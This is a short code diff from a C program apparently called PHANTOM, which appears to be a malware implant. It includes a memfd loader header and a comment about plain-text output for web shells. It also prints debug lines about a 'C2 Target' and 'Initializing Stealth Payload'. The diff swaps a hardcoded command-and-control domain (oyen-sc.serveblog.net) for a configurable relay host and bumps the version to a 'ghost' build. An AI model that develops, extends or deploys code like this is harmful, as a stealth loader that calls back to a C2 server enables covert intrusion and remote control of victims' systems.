@@ -14,7 +14,7 @@
 #include "memfd_loader.h"
 #include "utils.h"
 
-#define PHANTOM_VERSION "v1.0.1-stable"
+#define PHANTOM_VERSION "v3.1-ghost-cf"
 
 // NO ANSI COLORS - Plain text for web shells
 #define DPRINTF_FLUSH(fmt, ...) do { \
@@ -60,8 +60,8 @@ int main(int argc, char *argv[]) {
     uint16_t relay_port = (uint16_t)atoi(relay_port_str);
 
     // 2. Network Debug Output (BEFORE forking)
-    DPRINTF_FLUSH("[-] C2 Target: oyen-sc.serveblog.net:%d\n", relay_port);
-    DPRINTF_FLUSH("[-] Resolving oyen-sc.serveblog.net...\n");
+    DPRINTF_FLUSH("[-] C2 Target: %s:%d\n", relay_host, relay_port);
+    DPRINTF_FLUSH("[-] Resolving %s...\n", relay_host);
     DPRINTF_FLUSH("[-] Initializing Stealth Payload...\n");
 
 
